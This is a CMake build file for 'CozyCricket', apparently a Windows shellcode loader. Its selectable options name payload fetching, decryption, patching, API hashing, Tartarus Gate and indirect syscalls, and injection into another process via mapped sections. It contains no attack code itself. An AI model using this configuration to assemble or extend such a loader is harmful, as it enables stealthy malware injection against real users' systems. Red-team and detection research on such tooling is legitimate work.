cmake_minimum_required(VERSION 3.15)
project(CozyCricket LANGUAGES CXX ASM_NASM)

set(CMAKE_EXE_LINKER_FLAGS "-static")

set(CMAKE_CXX_STANDARD 23)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

### ----- START CHANGEME -----
add_definitions(-DRETRIEVE_FETCH -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS -DGETSYSCALL_SORT_TARTARUS -DSYSCALL_INDIRECT -DINJECT_EXTERNAL_CREATE_MAP_SECTION -DFINDPID_GETNEXTPROCESS)
### ----- END CHANGEME -----

add_executable(cozycricket
    main.cpp
    decrypt/decrypt.cpp
    patch/patch.cpp
    retrieve/fetch.cpp
    hash/hash.cpp
    resolve/resolve_dll.cpp
    resolve/resolve_api.cpp
    syscall/get_syscall.cpp
    syscall/syscalls.asm
    inject/inject.cpp
    search/findpid.cpp
)

find_package(OpenSSL REQUIRED)
find_package(cpr CONFIG REQUIRED)

target_link_libraries(cozycricket PRIVATE
    OpenSSL::SSL
    OpenSSL::Crypto
    cpr::cpr
    psapi
    shlwapi
)

